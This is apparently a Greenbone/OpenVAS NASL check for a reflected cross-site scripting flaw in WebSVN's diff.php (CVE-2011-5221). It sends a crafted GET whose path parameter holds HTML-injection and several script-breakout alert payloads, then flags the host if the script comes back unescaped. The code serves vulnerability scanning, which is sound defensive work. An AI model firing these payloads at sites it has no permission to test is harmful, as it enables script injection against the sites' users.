# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:tigris:websvn";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103368");
  script_version("2022-04-01T05:47:35+0000");
  script_tag(name:"last_modification", value:"2022-04-01 05:47:35 +0000 (Fri, 01 Apr 2022)");
  script_tag(name:"creation_date", value:"2011-12-20 10:27:58 +0100 (Tue, 20 Dec 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2011-5221");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("WebSVN Multiple XSS Vulnerabilities (Dec 2011)");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_websvn_http_detect.nasl");
  script_mandatory_keys("websvn/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"WebSVN is prone to multiple cross-site scripting (XSS)
  vulnerabilities because it fails to properly sanitize user-supplied input before using it in
  dynamically generated content.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"An attacker may leverage these issues to execute arbitrary
  script code in the browser of an unsuspecting user in the context of the affected site. This can
  allow the attacker to steal cookie-based authentication credentials and launch other attacks.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://st2tea.blogspot.com/2011/12/websvn-cross-site-scripting.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/";

req = http_get(item: url, port: port);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: FALSE);

repname = eregmatch(pattern: "listing\.php\?repname=([a-zA-Z0-0-_]+)", string: res);
if (isnull(repname[1]))
  exit(0);

url = dir + "/diff.php?repname=" + repname[1] + '&path=%2F<hr+color%3D"blue"+size%3D"70"+style%3D"border%3A+dotted+5pt%3B+border-color%3A+red+"><marquee+direction%3D"up"+scrollamount%3D"1"+height%3D"150"+style%3D"filter%3Awave(add%3D1%2C+phase%3D10%2C+freq%3D2%2C+strength%3D300)%3B+colortag%3D"red"%3B><font+color%3D"navy"+size%3D%2B3>FLYING+TEXT<%2Ffont><%2Fmarquee>' +
      "'%3Balert(String.fromCharCode(88%2C83%2C83))%2F%2F\\'%3Balert(String.fromCharCode(88%2C83%2C83))%2F%2F" +
      '"%3Balert(String.fromCharCode(88%2C83%2C83))%2F%2F\"%3Balert(/vt-xss-test/)%2F%2F--><%2FSCRIPT>">' +
      "'><SCRIPT>alert(/vt-xss-test/)<%2FSCRIPT>";

if (http_vuln_check(port: port, url: url, pattern: "<SCRIPT>alert\(/vt-xss-test/\)</SCRIPT>",
                    check_header: TRUE)) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
